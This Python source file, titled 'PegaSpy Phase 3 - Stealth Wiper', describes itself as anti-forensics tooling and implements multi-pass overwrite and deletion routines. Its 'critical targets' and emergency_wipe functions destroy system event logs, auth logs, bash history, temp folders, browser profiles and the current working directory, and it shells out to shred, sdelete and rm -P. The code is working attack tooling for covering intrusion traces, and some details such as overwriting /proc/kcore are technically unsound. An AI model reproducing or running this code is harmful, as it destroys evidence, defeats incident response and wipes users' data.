#!/usr/bin/env python3
"""
PegaSpy Phase 3 - Stealth Wiper
Advanced file and memory wiping with anti-forensics capabilities
"""

import os
import sys
import time
import random
import hashlib
import asyncio
import platform
import subprocess
from enum import Enum
from typing import List, Dict, Optional, Tuple, Any
from dataclasses import dataclass, field
from pathlib import Path
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class WipeMethod(Enum):
    """File wiping methods"""
    SIMPLE_OVERWRITE = "simple_overwrite"
    DOD_3_PASS = "dod_3_pass"
    DOD_7_PASS = "dod_7_pass"
    GUTMANN_35_PASS = "gutmann_35_pass"
    RANDOM_OVERWRITE = "random_overwrite"
    ZERO_FILL = "zero_fill"
    SECURE_DELETE = "secure_delete"

class WipeTarget(Enum):
    """Types of targets to wipe"""
    FILES = "files"
    DIRECTORIES = "directories"
    FREE_SPACE = "free_space"
    MEMORY = "memory"
    SWAP = "swap"
    REGISTRY = "registry"
    LOGS = "logs"
    TEMP_FILES = "temp_files"
    BROWSER_DATA = "browser_data"
    METADATA = "metadata"

class WipeStatus(Enum):
    """Wipe operation status"""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"

@dataclass
class WipeTask:
    """Individual wipe task"""
    target_path: str
    target_type: WipeTarget
    wipe_method: WipeMethod
    priority: int = 1
    status: WipeStatus = WipeStatus.PENDING
    progress: float = 0.0
    error_message: Optional[str] = None
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    bytes_wiped: int = 0
    passes_completed: int = 0
    
    def get_duration(self) -> float:
        """Get task duration in seconds"""
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0

@dataclass
class WipeStatistics:
    """Wipe operation statistics"""
    total_tasks: int = 0
    completed_tasks: int = 0
    failed_tasks: int = 0
    skipped_tasks: int = 0
    total_bytes_wiped: int = 0
    total_files_wiped: int = 0
    total_directories_wiped: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    
    def get_success_rate(self) -> float:
        """Calculate success rate percentage"""
        if self.total_tasks == 0:
            return 0.0
        return (self.completed_tasks / self.total_tasks) * 100
    
    def get_total_duration(self) -> float:
        """Get total operation duration"""
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0

class StealthWiper:
    """Advanced stealth file and memory wiper"""
    
    def __init__(self):
        self.tasks: List[WipeTask] = []
        self.statistics = WipeStatistics()
        self.is_running = False
        self.stop_requested = False
        
        # Gutmann 35-pass pattern
        self.gutmann_patterns = [
            b'\x55', b'\xAA', b'\x92\x49\x24', b'\x49\x24\x92',
            b'\x24\x92\x49', b'\x00', b'\x11', b'\x22', b'\x33',
            b'\x44', b'\x55', b'\x66', b'\x77', b'\x88', b'\x99',
            b'\xAA', b'\xBB', b'\xCC', b'\xDD', b'\xEE', b'\xFF',
            b'\x92\x49\x24', b'\x49\x24\x92', b'\x24\x92\x49',
            b'\x6D\xB6\xDB', b'\xB6\xDB\x6D', b'\xDB\x6D\xB6'
        ]
        
        # Platform-specific configurations
        self.platform = platform.system().lower()
        self._configure_platform_specific()
    
    def _configure_platform_specific(self):
        """Configure platform-specific settings"""
        if self.platform == 'windows':
            self.temp_dirs = [
                os.environ.get('TEMP', ''),
                os.environ.get('TMP', ''),
                'C:\\Windows\\Temp',
                'C:\\Users\\*\\AppData\\Local\\Temp'
            ]
            self.log_paths = [
                'C:\\Windows\\System32\\winevt\\Logs',
                'C:\\Windows\\Logs',
                'C:\\ProgramData\\Microsoft\\Windows\\WER'
            ]
        elif self.platform == 'darwin':
            self.temp_dirs = [
                '/tmp',
                '/var/tmp',
                '/private/tmp',
                '/private/var/tmp',
                '~/Library/Caches'
            ]
            self.log_paths = [
                '/var/log',
                '/private/var/log',
                '~/Library/Logs'
            ]
        else:  # Linux
            self.temp_dirs = [
                '/tmp',
                '/var/tmp',
                '/dev/shm',
                '~/.cache'
            ]
            self.log_paths = [
                '/var/log',
                '/var/log/syslog',
                '/var/log/auth.log',
                '~/.bash_history'
            ]
    
    def add_wipe_task(self, target_path: str, target_type: WipeTarget, 
                     wipe_method: WipeMethod = WipeMethod.DOD_3_PASS,
                     priority: int = 1) -> bool:
        """Add a wipe task to the queue"""
        try:
            task = WipeTask(
                target_path=target_path,
                target_type=target_type,
                wipe_method=wipe_method,
                priority=priority
            )
            self.tasks.append(task)
            self.statistics.total_tasks += 1
            logger.info(f"Added wipe task: {target_path} ({target_type.value})")
            return True
        except Exception as e:
            logger.error(f"Failed to add wipe task: {e}")
            return False
    
    def add_critical_targets(self) -> bool:
        """Add critical system targets for wiping"""
        try:
            # Add temporary directories
            for temp_dir in self.temp_dirs:
                if temp_dir and os.path.exists(temp_dir):
                    self.add_wipe_task(temp_dir, WipeTarget.TEMP_FILES, 
                                     WipeMethod.DOD_3_PASS, priority=3)
            
            # Add log directories
            for log_path in self.log_paths:
                if log_path and os.path.exists(log_path):
                    self.add_wipe_task(log_path, WipeTarget.LOGS, 
                                     WipeMethod.DOD_7_PASS, priority=2)
            
            # Add browser data
            browser_paths = self._get_browser_data_paths()
            for browser_path in browser_paths:
                if os.path.exists(browser_path):
                    self.add_wipe_task(browser_path, WipeTarget.BROWSER_DATA,
                                     WipeMethod.GUTMANN_35_PASS, priority=1)
            
            # Add memory and swap
            self.add_wipe_task("/proc/kcore", WipeTarget.MEMORY, 
                             WipeMethod.RANDOM_OVERWRITE, priority=1)
            
            return True
        except Exception as e:
            logger.error(f"Failed to add critical targets: {e}")
            return False
    
    def _get_browser_data_paths(self) -> List[str]:
        """Get browser data paths for current platform"""
        paths = []
        
        if self.platform == 'windows':
            user_profile = os.environ.get('USERPROFILE', '')
            paths.extend([
                f"{user_profile}\\AppData\\Local\\Google\\Chrome\\User Data",
                f"{user_profile}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                f"{user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data"
            ])
        elif self.platform == 'darwin':
            home = os.path.expanduser('~')
            paths.extend([
                f"{home}/Library/Application Support/Google/Chrome",
                f"{home}/Library/Application Support/Firefox/Profiles",
                f"{home}/Library/Application Support/Microsoft Edge"
            ])
        else:  # Linux
            home = os.path.expanduser('~')
            paths.extend([
                f"{home}/.config/google-chrome",
                f"{home}/.mozilla/firefox",
                f"{home}/.config/microsoft-edge"
            ])
        
        return paths
    
    async def execute_wipe_tasks(self) -> bool:
        """Execute all wipe tasks"""
        if self.is_running:
            logger.warning("Wipe operation already in progress")
            return False
        
        try:
            self.is_running = True
            self.stop_requested = False
            self.statistics.start_time = time.time()
            
            # Sort tasks by priority (higher priority first)
            sorted_tasks = sorted(self.tasks, key=lambda x: x.priority, reverse=True)
            
            logger.info(f"Starting wipe operation with {len(sorted_tasks)} tasks")
            
            for task in sorted_tasks:
                if self.stop_requested:
                    task.status = WipeStatus.SKIPPED
                    self.statistics.skipped_tasks += 1
                    continue
                
                await self._execute_single_task(task)
            
            self.statistics.end_time = time.time()
            self.is_running = False
            
            logger.info(f"Wipe operation completed. Success rate: {self.statistics.get_success_rate():.1f}%")
            return True
            
        except Exception as e:
            logger.error(f"Wipe operation failed: {e}")
            self.is_running = False
            return False
    
    async def _execute_single_task(self, task: WipeTask) -> bool:
        """Execute a single wipe task"""
        try:
            task.status = WipeStatus.IN_PROGRESS
            task.start_time = time.time()
            
            logger.info(f"Wiping {task.target_path} using {task.wipe_method.value}")
            
            if task.target_type == WipeTarget.FILES:
                success = await self._wipe_file(task)
            elif task.target_type == WipeTarget.DIRECTORIES:
                success = await self._wipe_directory(task)
            elif task.target_type == WipeTarget.FREE_SPACE:
                success = await self._wipe_free_space(task)
            elif task.target_type == WipeTarget.MEMORY:
                success = await self._wipe_memory(task)
            elif task.target_type == WipeTarget.TEMP_FILES:
                success = await self._wipe_temp_files(task)
            elif task.target_type == WipeTarget.LOGS:
                success = await self._wipe_logs(task)
            elif task.target_type == WipeTarget.BROWSER_DATA:
                success = await self._wipe_browser_data(task)
            else:
                success = await self._wipe_generic(task)
            
            task.end_time = time.time()
            
            if success:
                task.status = WipeStatus.COMPLETED
                self.statistics.completed_tasks += 1
            else:
                task.status = WipeStatus.FAILED
                self.statistics.failed_tasks += 1
            
            return success
            
        except Exception as e:
            task.error_message = str(e)
            task.status = WipeStatus.FAILED
            task.end_time = time.time()
            self.statistics.failed_tasks += 1
            logger.error(f"Task failed: {e}")
            return False
    
    async def _wipe_file(self, task: WipeTask) -> bool:
        """Wipe a single file"""
        try:
            file_path = Path(task.target_path)
            if not file_path.exists():
                logger.warning(f"File not found: {task.target_path}")
                return False
            
            file_size = file_path.stat().st_size
            
            # Perform the wipe based on method
            if task.wipe_method == WipeMethod.SIMPLE_OVERWRITE:
                success = await self._simple_overwrite(file_path, task)
            elif task.wipe_method == WipeMethod.DOD_3_PASS:
                success = await self._dod_3_pass(file_path, task)
            elif task.wipe_method == WipeMethod.DOD_7_PASS:
                success = await self._dod_7_pass(file_path, task)
            elif task.wipe_method == WipeMethod.GUTMANN_35_PASS:
                success = await self._gutmann_35_pass(file_path, task)
            elif task.wipe_method == WipeMethod.RANDOM_OVERWRITE:
                success = await self._random_overwrite(file_path, task)
            elif task.wipe_method == WipeMethod.ZERO_FILL:
                success = await self._zero_fill(file_path, task)
            else:
                success = await self._secure_delete(file_path, task)
            
            if success:
                # Remove the file
                try:
                    file_path.unlink()
                    task.bytes_wiped = file_size
                    self.statistics.total_bytes_wiped += file_size
                    self.statistics.total_files_wiped += 1
                except Exception as e:
                    logger.error(f"Failed to remove file {file_path}: {e}")
                    return False
            
            return success
            
        except Exception as e:
            logger.error(f"Failed to wipe file {task.target_path}: {e}")
            return False
    
    async def _simple_overwrite(self, file_path: Path, task: WipeTask) -> bool:
        """Simple single-pass overwrite"""
        try:
            with open(file_path, 'r+b') as f:
                file_size = f.seek(0, 2)  # Seek to end
                f.seek(0)  # Seek to beginning
                
                # Write random data
                chunk_size = 64 * 1024  # 64KB chunks
                written = 0
                
                while written < file_size:
                    remaining = min(chunk_size, file_size - written)
                    random_data = os.urandom(remaining)
                    f.write(random_data)
                    written += remaining
                    
                    task.progress = (written / file_size) * 100
                    await asyncio.sleep(0.001)  # Yield control
                
                f.flush()
                os.fsync(f.fileno())
                task.passes_completed = 1
            
            return True
        except Exception as e:
            logger.error(f"Simple overwrite failed: {e}")
            return False
    
    async def _dod_3_pass(self, file_path: Path, task: WipeTask) -> bool:
        """DoD 3-pass wipe (0x00, 0xFF, random)"""
        patterns = [b'\x00', b'\xFF', None]  # None = random
        
        try:
            for pass_num, pattern in enumerate(patterns, 1):
                with open(file_path, 'r+b') as f:
                    file_size = f.seek(0, 2)
                    f.seek(0)
                    
                    chunk_size = 64 * 1024
                    written = 0
                    
                    while written < file_size:
                        remaining = min(chunk_size, file_size - written)
                        
                        if pattern is None:
                            data = os.urandom(remaining)
                        else:
                            data = pattern * remaining
                        
                        f.write(data)
                        written += remaining
                        
                        # Update progress across all passes
                        total_progress = ((pass_num - 1) * 100 + (written / file_size) * 100) / 3
                        task.progress = total_progress
                        
                        await asyncio.sleep(0.001)
                    
                    f.flush()
                    os.fsync(f.fileno())
                
                task.passes_completed = pass_num
                await asyncio.sleep(0.01)  # Brief pause between passes
            
            return True
        except Exception as e:
            logger.error(f"DoD 3-pass failed: {e}")
            return False
    
    async def _dod_7_pass(self, file_path: Path, task: WipeTask) -> bool:
        """DoD 7-pass wipe"""
        patterns = [
            b'\x00', b'\xFF', b'\x00', b'\xFF', 
            b'\x00', b'\xFF', None  # None = random
        ]
        
        try:
            for pass_num, pattern in enumerate(patterns, 1):
                with open(file_path, 'r+b') as f:
                    file_size = f.seek(0, 2)
                    f.seek(0)
                    
                    chunk_size = 64 * 1024
                    written = 0
                    
                    while written < file_size:
                        remaining = min(chunk_size, file_size - written)
                        
                        if pattern is None:
                            data = os.urandom(remaining)
                        else:
                            data = pattern * remaining
                        
                        f.write(data)
                        written += remaining
                        
                        total_progress = ((pass_num - 1) * 100 + (written / file_size) * 100) / 7
                        task.progress = total_progress
                        
                        await asyncio.sleep(0.001)
                    
                    f.flush()
                    os.fsync(f.fileno())
                
                task.passes_completed = pass_num
                await asyncio.sleep(0.01)
            
            return True
        except Exception as e:
            logger.error(f"DoD 7-pass failed: {e}")
            return False
    
    async def _gutmann_35_pass(self, file_path: Path, task: WipeTask) -> bool:
        """Gutmann 35-pass wipe"""
        try:
            total_passes = 35
            
            for pass_num in range(1, total_passes + 1):
                with open(file_path, 'r+b') as f:
                    file_size = f.seek(0, 2)
                    f.seek(0)
                    
                    # Select pattern for this pass
                    if pass_num <= 4 or pass_num >= 32:
                        # Random passes
                        pattern = None
                    else:
                        # Use Gutmann patterns
                        pattern_index = (pass_num - 5) % len(self.gutmann_patterns)
                        pattern = self.gutmann_patterns[pattern_index]
                    
                    chunk_size = 64 * 1024
                    written = 0
                    
                    while written < file_size:
                        remaining = min(chunk_size, file_size - written)
                        
                        if pattern is None:
                            data = os.urandom(remaining)
                        else:
                            data = pattern * (remaining // len(pattern) + 1)
                            data = data[:remaining]
                        
                        f.write(data)
                        written += remaining
                        
                        total_progress = ((pass_num - 1) * 100 + (written / file_size) * 100) / total_passes
                        task.progress = total_progress
                        
                        await asyncio.sleep(0.001)
                    
                    f.flush()
                    os.fsync(f.fileno())
                
                task.passes_completed = pass_num
                
                # Brief pause every 5 passes
                if pass_num % 5 == 0:
                    await asyncio.sleep(0.05)
            
            return True
        except Exception as e:
            logger.error(f"Gutmann 35-pass failed: {e}")
            return False
    
    async def _random_overwrite(self, file_path: Path, task: WipeTask) -> bool:
        """Random data overwrite"""
        try:
            with open(file_path, 'r+b') as f:
                file_size = f.seek(0, 2)
                f.seek(0)
                
                chunk_size = 64 * 1024
                written = 0
                
                while written < file_size:
                    remaining = min(chunk_size, file_size - written)
                    random_data = os.urandom(remaining)
                    f.write(random_data)
                    written += remaining
                    
                    task.progress = (written / file_size) * 100
                    await asyncio.sleep(0.001)
                
                f.flush()
                os.fsync(f.fileno())
                task.passes_completed = 1
            
            return True
        except Exception as e:
            logger.error(f"Random overwrite failed: {e}")
            return False
    
    async def _zero_fill(self, file_path: Path, task: WipeTask) -> bool:
        """Zero fill overwrite"""
        try:
            with open(file_path, 'r+b') as f:
                file_size = f.seek(0, 2)
                f.seek(0)
                
                chunk_size = 64 * 1024
                zero_chunk = b'\x00' * chunk_size
                written = 0
                
                while written < file_size:
                    remaining = min(chunk_size, file_size - written)
                    if remaining < chunk_size:
                        zero_chunk = b'\x00' * remaining
                    
                    f.write(zero_chunk)
                    written += remaining
                    
                    task.progress = (written / file_size) * 100
                    await asyncio.sleep(0.001)
                
                f.flush()
                os.fsync(f.fileno())
                task.passes_completed = 1
            
            return True
        except Exception as e:
            logger.error(f"Zero fill failed: {e}")
            return False
    
    async def _secure_delete(self, file_path: Path, task: WipeTask) -> bool:
        """Platform-specific secure delete"""
        try:
            if self.platform == 'windows':
                # Use sdelete if available
                cmd = f'sdelete -p 3 -s -z "{file_path}"'
            elif self.platform == 'darwin':
                # Use rm with secure option
                cmd = f'rm -P "{file_path}"'
            else:
                # Use shred on Linux
                cmd = f'shred -vfz -n 3 "{file_path}"'
            
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                task.progress = 100.0
                task.passes_completed = 3
                return True
            else:
                logger.error(f"Secure delete failed: {stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"Secure delete failed: {e}")
            return False
    
    async def _wipe_directory(self, task: WipeTask) -> bool:
        """Wipe entire directory recursively"""
        try:
            dir_path = Path(task.target_path)
            if not dir_path.exists():
                return False
            
            # Get all files in directory
            all_files = list(dir_path.rglob('*'))
            files_only = [f for f in all_files if f.is_file()]
            
            total_files = len(files_only)
            if total_files == 0:
                return True
            
            processed = 0
            
            for file_path in files_only:
                # Create sub-task for each file
                sub_task = WipeTask(
                    target_path=str(file_path),
                    target_type=WipeTarget.FILES,
                    wipe_method=task.wipe_method
                )
                
                success = await self._wipe_file(sub_task)
                if success:
                    task.bytes_wiped += sub_task.bytes_wiped
                
                processed += 1
                task.progress = (processed / total_files) * 100
                
                await asyncio.sleep(0.001)
            
            # Remove empty directories
            try:
                for dir_path in sorted(all_files, key=lambda x: len(str(x)), reverse=True):
                    if dir_path.is_dir() and dir_path.exists():
                        dir_path.rmdir()
                
                # Remove the main directory
                if dir_path.exists():
                    dir_path.rmdir()
                    self.statistics.total_directories_wiped += 1
            except Exception as e:
                logger.warning(f"Failed to remove some directories: {e}")
            
            return True
            
        except Exception as e:
            logger.error(f"Directory wipe failed: {e}")
            return False
    
    async def _wipe_free_space(self, task: WipeTask) -> bool:
        """Wipe free space on disk"""
        try:
            # Create temporary files to fill free space
            temp_dir = Path(task.target_path)
            if not temp_dir.exists():
                temp_dir = Path.cwd()
            
            temp_files = []
            chunk_size = 10 * 1024 * 1024  # 10MB chunks
            file_count = 0
            
            try:
                while True:
                    temp_file = temp_dir / f"wipe_temp_{file_count}.tmp"
                    temp_files.append(temp_file)
                    
                    with open(temp_file, 'wb') as f:
                        try:
                            while True:
                                random_data = os.urandom(chunk_size)
                                f.write(random_data)
                                task.bytes_wiped += chunk_size
                                await asyncio.sleep(0.001)
                        except OSError:
                            # Disk full
                            break
                    
                    file_count += 1
                    if file_count > 1000:  # Safety limit
                        break
                        
            except OSError:
                # Expected when disk is full
                pass
            
            # Clean up temporary files
            for temp_file in temp_files:
                try:
                    if temp_file.exists():
                        temp_file.unlink()
                except Exception:
                    pass
            
            task.progress = 100.0
            return True
            
        except Exception as e:
            logger.error(f"Free space wipe failed: {e}")
            return False
    
    async def _wipe_memory(self, task: WipeTask) -> bool:
        """Wipe memory (allocate and fill)"""
        try:
            # Allocate large chunks of memory and fill with random data
            memory_chunks = []
            chunk_size = 10 * 1024 * 1024  # 10MB chunks
            max_chunks = 100  # Limit to prevent system crash
            
            for i in range(max_chunks):
                try:
                    chunk = bytearray(os.urandom(chunk_size))
                    memory_chunks.append(chunk)
                    task.bytes_wiped += chunk_size
                    task.progress = (i / max_chunks) * 100
                    await asyncio.sleep(0.01)
                except MemoryError:
                    break
            
            # Overwrite chunks multiple times
            for _ in range(3):
                for chunk in memory_chunks:
                    for j in range(0, len(chunk), 1024):
                        end = min(j + 1024, len(chunk))
                        chunk[j:end] = os.urandom(end - j)
                    await asyncio.sleep(0.001)
            
            # Clear references
            memory_chunks.clear()
            
            task.progress = 100.0
            return True
            
        except Exception as e:
            logger.error(f"Memory wipe failed: {e}")
            return False
    
    async def _wipe_temp_files(self, task: WipeTask) -> bool:
        """Wipe temporary files"""
        return await self._wipe_directory(task)
    
    async def _wipe_logs(self, task: WipeTask) -> bool:
        """Wipe log files"""
        return await self._wipe_directory(task)
    
    async def _wipe_browser_data(self, task: WipeTask) -> bool:
        """Wipe browser data"""
        return await self._wipe_directory(task)
    
    async def _wipe_generic(self, task: WipeTask) -> bool:
        """Generic wipe handler"""
        path = Path(task.target_path)
        if path.is_file():
            return await self._wipe_file(task)
        elif path.is_dir():
            return await self._wipe_directory(task)
        else:
            return False
    
    def stop_wipe_operation(self) -> bool:
        """Stop the current wipe operation"""
        if self.is_running:
            self.stop_requested = True
            logger.info("Wipe operation stop requested")
            return True
        return False
    
    def get_wipe_status(self) -> Dict[str, Any]:
        """Get current wipe status"""
        return {
            'is_running': self.is_running,
            'stop_requested': self.stop_requested,
            'total_tasks': len(self.tasks),
            'statistics': {
                'total_tasks': self.statistics.total_tasks,
                'completed_tasks': self.statistics.completed_tasks,
                'failed_tasks': self.statistics.failed_tasks,
                'skipped_tasks': self.statistics.skipped_tasks,
                'success_rate': self.statistics.get_success_rate(),
                'total_bytes_wiped': self.statistics.total_bytes_wiped,
                'total_files_wiped': self.statistics.total_files_wiped,
                'total_directories_wiped': self.statistics.total_directories_wiped,
                'duration': self.statistics.get_total_duration()
            },
            'tasks': [
                {
                    'target_path': task.target_path,
                    'target_type': task.target_type.value,
                    'wipe_method': task.wipe_method.value,
                    'status': task.status.value,
                    'progress': task.progress,
                    'bytes_wiped': task.bytes_wiped,
                    'passes_completed': task.passes_completed,
                    'duration': task.get_duration(),
                    'error_message': task.error_message
                }
                for task in self.tasks
            ]
        }
    
    def clear_completed_tasks(self) -> int:
        """Clear completed tasks from queue"""
        initial_count = len(self.tasks)
        self.tasks = [task for task in self.tasks if task.status != WipeStatus.COMPLETED]
        cleared_count = initial_count - len(self.tasks)
        logger.info(f"Cleared {cleared_count} completed tasks")
        return cleared_count
    
    async def emergency_wipe(self) -> bool:
        """Emergency wipe of critical data"""
        try:
            logger.warning("EMERGENCY WIPE INITIATED")
            
            # Clear existing tasks and add emergency targets
            self.tasks.clear()
            self.statistics = WipeStatistics()
            
            # Add critical targets with maximum security
            self.add_critical_targets()
            
            # Add current working directory
            self.add_wipe_task(str(Path.cwd()), WipeTarget.DIRECTORIES, 
                             WipeMethod.GUTMANN_35_PASS, priority=5)
            
            # Execute with maximum priority
            return await self.execute_wipe_tasks()
            
        except Exception as e:
            logger.error(f"Emergency wipe failed: {e}")
            return False

# Test function
if __name__ == "__main__":
    async def test_stealth_wiper():
        """Test the stealth wiper"""
        wiper = StealthWiper()
        
        print("Testing Stealth Wiper...")
        
        # Create test file
        test_file = Path("test_wipe_file.txt")
        test_content = "This is a test file for wiping" * 1000
        test_file.write_text(test_content)
        
        print(f"\n1. Created test file: {test_file} ({len(test_content)} bytes)")
        
        # Add wipe task
        success = wiper.add_wipe_task(
            str(test_file), 
            WipeTarget.FILES, 
            WipeMethod.DOD_3_PASS
        )
        print(f"Added wipe task: {success}")
        
        # Execute wipe
        print("\n2. Executing wipe operation...")
        success = await wiper.execute_wipe_tasks()
        print(f"Wipe completed: {success}")
        
        # Check status
        status = wiper.get_wipe_status()
        print(f"\nWipe Status:")
        print(f"  Success rate: {status['statistics']['success_rate']:.1f}%")
        print(f"  Bytes wiped: {status['statistics']['total_bytes_wiped']}")
        print(f"  Files wiped: {status['statistics']['total_files_wiped']}")
        print(f"  Duration: {status['statistics']['duration']:.2f}s")
        
        # Verify file is gone
        file_exists = test_file.exists()
        print(f"\nTest file still exists: {file_exists}")
        
        print("\nStealth wiper test complete")
    
    # Run the test
    asyncio.run(test_stealth_wiper())